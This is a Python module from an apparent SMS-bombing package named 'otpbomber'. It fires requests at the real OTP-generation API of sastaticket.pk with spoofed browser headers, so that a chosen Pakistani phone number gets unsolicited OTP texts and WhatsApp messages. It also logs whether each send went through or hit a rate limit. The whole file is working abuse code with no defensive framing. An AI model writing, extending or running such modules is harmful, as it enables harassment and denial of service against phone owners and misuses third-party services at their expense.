from otpbomber.core import *
from otpbomber.localuseragent import *

async def sastaticket(phone, client, out):
    name = "sastaticket"
    domain = "sastaticket"
    frequent_rate_limit=False
    headers = {
        'content-type': 'application/json',
        'origin': 'https://www.sastaticket.pk',
        'referer': 'https://www.sastaticket.pk/',
        'user-agent': random.choice(ua["browsers"]["chrome"])
    }

    json_data = {
        'mobile_number':f"+92{phone[-10:]}",
    }

    response = await client.post('https://backend.sastaticket.pk/api/v3/users/generate_otp/', headers=headers, json=json_data)

    try:
        data=response.json()

        if data["data"]['message'] == "A text message has been sent to your authorized mobile number and WhatsApp account with OTP for validation.":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        if data["data"]['message'] == "OTP is already sent. Please try it again.":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None